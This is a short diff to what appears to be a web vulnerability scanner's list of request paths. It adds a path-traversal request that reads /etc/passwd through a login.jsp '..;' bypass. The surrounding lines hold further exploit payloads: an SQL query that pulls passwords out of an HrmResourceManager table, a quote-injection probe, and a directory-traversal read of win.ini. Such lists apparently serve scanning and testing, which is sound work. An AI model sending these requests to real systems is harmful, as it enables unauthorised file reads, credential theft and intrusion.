@@ -1,6 +1,7 @@
 /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager
 /messageType.do?method=create&typeName=1%27
 /REST/v1/swagger
+/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
 /xmlpserver/servlet/adfresource?format=aaaaaaaaaaaaaaa&documentId=..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\Windows\win.ini
 /workspace/index.jsp
 /atlantis/login.php
